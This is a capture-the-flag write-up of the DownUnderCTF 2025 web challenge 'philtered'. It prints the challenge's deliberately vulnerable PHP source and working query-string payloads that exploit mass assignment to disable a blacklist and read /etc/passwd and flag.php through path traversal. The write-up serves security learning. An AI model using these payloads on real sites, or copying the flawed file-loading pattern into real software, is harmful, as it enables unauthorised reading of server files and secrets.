---
title: "DownUnderCTF: philtered"
categories: [DownUnderCTF2025]
tags: [beginner, web, easy, DUCTF2025]
render_with_liquid: false
media_subpath: /images/ductf2025_philtered/
image:
  path: room_image.png
---

## Room recap:
**Philtered** was the next room I managed to solve in DUCTF2025, and honestly, the moment I saw the name, I got a hunch it might involve some kind of LFI (Local File Inclusion) or PHP filter wrapper shenanigans.

Turns out I wasn’t entirely wrong.

This room revolves around a classic **mass assignment vulnerability**. More specifically, it leverages the ability to override internal config parameters via **$_GET**, allowing us to manipulate sensitive properties like file paths and eventually access the flag.

### Room link:
[![DownUnderCTF Room Link](room_link.png){: width="1000" height="1000" .shadow}](https://2025.duc.tf/challenges?c=philtered){: .center }

## Key Takeaways

🧠 Learned about the mass assignment vulnerability.

🧠 Gained a deeper understanding of the $_GET superglobal in PHP.

🧠 Learned the meaning and usage of the "->" operator in PHP


## Ight. Let's do this!

Upon launching the challenge, we land on a fairly simple web page:

![Philtered page](index_plain.png){: width="800" height="800" .shadow}

After clicking around and inspecting every button on the page, nothing immediately stood out. 
But one thing that caught my eye was the way the site handled file inclusion, it seemed like it might be dynamically using PHP’s include or require. 

![Philtered page](index_page.png){: width="800" height="800" .shadow}

That raised a red flag: **LFI (Local File Inclusion) could be in play.**

Since there weren't many clues available on the site itself, I downloaded the src.zip file that the CTF provided and started digging through the source code for more context.

Inside the ZIP archive, I extracted and used some help from AI to quickly scanned each file, and two PHP files immediately caught my attention: index.php and flag.php.

## L*I WAS THE ANSWER!

### Inside flag.php
```console
<?php $flag = 'DUCTF{TEST_FLAG}'; ?>
```
{: file="flag.php" }

It became clear how the flag was meant to be retrieved: **through LFI** by accessing this file. 

However, simply visiting /flag.php in the browser led to nothing. (well DUH it wouldn't be this ez 👶).

Probably due to some filtering mechanism preventing direct access.

![Philtered page](empty_flag.png){: width="800" height="800" .shadow}

So I put that on the backburner for now.

### index.php – The Gold Mine

Now here’s where things get interesting. index.php is where the actual vulnerability lies.

```console
<?php

class Config {
    public $path = 'information.txt';
    public $data_folder = 'data/';
}

class FileLoader {
    public $config;
    // idk if we would need to load files from other directories or nested directories, but better to keep it flexible if I change my mind later
    public $allow_unsafe = false;
    // These terms will be philtered out to prevent unsafe file access
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\\'];
    
    public function __construct() {
        $this->config = new Config();
    }
    
    public function contains_blacklisted_term($value) {
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) {
                    return true;    
                }
            }
        }
        return false;
    }

    public function assign_props($input) {
        foreach ($input as $key => $value) {
            if (is_array($value) && isset($this->$key)) {
                foreach ($value as $subKey => $subValue) {
                    if (property_exists($this->$key, $subKey)) {
                        if ($this->contains_blacklisted_term($subValue)) {
                            $subValue = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                        }
                        $this->$key->$subKey = $subValue;
                    }
                }
            } else if (property_exists($this, $key)) {
                if ($this->contains_blacklisted_term($value)) {
                    $value = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                }
                $this->$key = $value;
            }
        }
    }

    public function load() {
        return file_get_contents($this->config->data_folder . $this->config->path);
    }
}

// Such elegance
$loader = new FileLoader(); 
$loader->assign_props($_GET);

require_once __DIR__ . '/layout.php';
<SNIP>
```
{: file="index.php" }

Let’s break down the functions that matters:

#### *contains_blacklisted_term()* 
This function checks if the input contains blacklisted terms. If it does, it blocks access. However, this can be bypassed by setting the public $allow_unsafe = true flag in the query string.

#### *assign_props()* 
This one is dangerous.

It takes values from $_GET and blindly assigns them to the *internal $config object*. This is **the core of the mass assignment issue**.
It allows an attacker to override sensitive internal configuration like:
- data_folder
- path
And there's zero filtering or validation on these values.

#### *load()* 
This is where the actual file loading happens via file_get_contents. Since we now control both data_folder and path, and the filtering check can be bypassed, this gives us **full Local File Inclusion capabilities**.

## Putting it all together.
Let’s test if the vulnerability works using the classic LFI payload going for the "passwd" file:

```console
https://web-philtered-0a2005e5b9bf.2025.ductf.net/?allow_unsafe=true&config[data_folder]=&config[path]=../../../../etc/passwd
```
> The "config[data_folder]" should not be assigned any value. since the default folder was /data and we know that the flag WAS NOT in /data.
{: .prompt-tip }

And it works! We’re reading /etc/passwd.

![Philtered page](etcpasswd.png){: width="800" height="800" .shadow}

So now let’s go for the kill. 

Here's the payload to read the actual flag.php:

```console
https://web-philtered-0a2005e5b9bf.2025.ductf.net/?allow_unsafe=true&config[data_folder]=&config[path]=flag.php
```

The main interface might look normal at first...but if we hit **Ctrl + U** to view the page source…

![The flag](flag_phil.png){: width="800" height="800" .shadow}

🎯 BINGOOOO! Flag captured.
## Thoughts?

This room was genuinely enjoyable. The theme, mechanics, and simplicity made it feel familiar yet engaging. While the vulnerability was rooted in basic PHP mishandling, it taught me valuable insights about:

- How mass assignment can be dangerous when used with user input.
- The interaction between $_GET, internal config objects, and dynamic file includes.
- Why never to let user-controlled input affect file paths without strict validation.

Another flag down. On to the next room! 🔐💥